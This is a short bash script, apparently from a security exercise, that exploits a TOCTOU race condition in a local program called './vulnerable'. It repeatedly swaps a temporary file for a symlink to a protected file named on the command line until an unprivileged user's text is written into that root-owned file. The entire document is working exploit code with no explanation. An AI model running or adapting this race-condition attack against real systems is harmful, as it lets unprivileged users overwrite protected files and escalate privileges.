#!/bin/bash
#RazviOverflow

TEMPFILE="temp.file"
OLD_LS=`ls -l $1`
NEW_LS=`ls -l $1`

echo "[+] Starting exploit (protected file "$1")"
while [ "$OLD_LS" == "$NEW_LS" ]
do
	rm -f $TEMPFILE
	echo "Base user is creating some dummy file" > $TEMPFILE
	echo "USER, without privileges, WROTE IN YOUR ROOT FILE" | ./vulnerable $TEMPFILE &
	unlink $TEMPFILE
	ln -s $1 $TEMPFILE &
	NEW_LS=`ls -l $1`
done